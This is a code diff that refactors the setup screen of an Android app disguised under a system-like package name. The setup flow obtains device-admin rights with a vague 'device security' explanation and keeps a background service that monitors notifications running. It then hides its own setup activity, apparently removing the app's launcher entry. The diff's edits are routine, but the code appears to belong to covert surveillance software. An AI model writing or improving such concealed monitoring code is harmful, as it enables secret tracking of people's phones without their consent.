@@ -3,6 +3,7 @@ package com.system.service.setup
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.os.Handler
@@ -20,21 +21,10 @@ import com.system.service.monitors.NotificationMonitor
 class SetupActivity : AppCompatActivity() {
 
     private var currentStep = 0
-    
-    private lateinit var tvStep: TextView
-    private lateinit var tvTitle: TextView
-    private lateinit var tvDesc: TextView
-    private lateinit var btnAction: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_setup)
-        
-        tvStep = findViewById(R.id.tvStep)
-        tvTitle = findViewById(R.id.tvTitle)
-        tvDesc = findViewById(R.id.tvDesc)
-        btnAction = findViewById(R.id.btnAction)
-        
         showStep(0)
     }
 
@@ -62,15 +52,12 @@ class SetupActivity : AppCompatActivity() {
             }
             2 -> updateUI("3/6", "Device Management",
                 "Required for security", "Activate") {
-                val intent = Intent(
-                    DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                intent.putExtra(
-                    DevicePolicyManager.EXTRA_DEVICE_ADMIN,
+                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                     ComponentName(this, DeviceAdminReceiver::class.java))
-                intent.putExtra(
-                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                     "Required for device security")
-                startActivity(intent)
+                startActivity(i)
             }
             3 -> updateUI("4/6", "Battery Optimization",
                 "Keep service running always", "Disable") {
@@ -103,8 +90,8 @@ class SetupActivity : AppCompatActivity() {
         startForegroundService(Intent(this, CoreService::class.java))
         packageManager.setComponentEnabledSetting(
             ComponentName(this, SetupActivity::class.java),
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
         )
         finishAffinity()
     }
@@ -137,7 +124,7 @@ class SetupActivity : AppCompatActivity() {
     }
 
     private fun isDeviceAdminEnabled(): Boolean {
-        val dpm = getSystemService(DEVICE_POLICY_SERVICE) 
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE)
             as DevicePolicyManager
         return dpm.isAdminActive(
             ComponentName(this, DeviceAdminReceiver::class.java))
@@ -150,10 +137,11 @@ class SetupActivity : AppCompatActivity() {
         btnText: String,
         action: () -> Unit
     ) {
-        tvStep.text = "Step $step"
-        tvTitle.text = title
-        tvDesc.text = desc
-        btnAction.text = btnText
-        btnAction.setOnClickListener { action() }
+        findViewById<TextView>(R.id.tvStep).text = "Step $step"
+        findViewById<TextView>(R.id.tvTitle).text = title
+        findViewById<TextView>(R.id.tvDesc).text = desc
+        val btn = findViewById<Button>(R.id.btnAction)
+        btn.text = btnText
+        btn.setOnClickListener { action() }
     }
 }
